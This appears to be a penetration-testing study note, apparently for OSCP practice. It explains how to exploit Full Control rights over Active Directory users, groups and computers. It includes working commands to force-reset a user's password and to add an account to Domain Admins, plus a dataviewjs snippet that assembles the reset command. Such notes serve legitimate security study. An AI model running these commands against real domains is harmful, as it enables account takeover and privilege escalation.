"Full Control" over the target object; can modify the attribute
You own it completely.
#### **If target is a User:** 
1. Force reset their password.
- **Change the Target’s Password**: Using `net user <username> <password> /domain`, the attacker can reset the user’s password.
2. [[Targeted Kerberoasting]]
3. [[Shadow Credentials]]
#### Change password
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `net rpc password [targetUser] '[myNewPW]' -U '${discoveredDomain}/[adminUser]%[adminPW]' -S {DC Hostname}`;

dv.paragraph("```bash\n" + command + "\n```");
```
#### Reset Password
Run from adminUser cmd
```
net user [targetUser] "Pass123!" /domain
```
or
Run from powershell
```powershell
$SecPassword = ConvertTo-SecureString "Pass123!" -AsPlainText -Force

Set-ADAccountPassword -Identity "[targetUser]" -NewPassword $SecPassword -Reset
```

#### **If target is a Group:** Add yourself/any user to that group.
- **Add Themselves to the Domain Admins Group**: This can be done via direct commands or using modules like Active Directory or PowerSploit.
1. Group Membership Modification

#### **If target is a Computer:**
1. [[Shadow Credentials]]
2. [[RBCD]]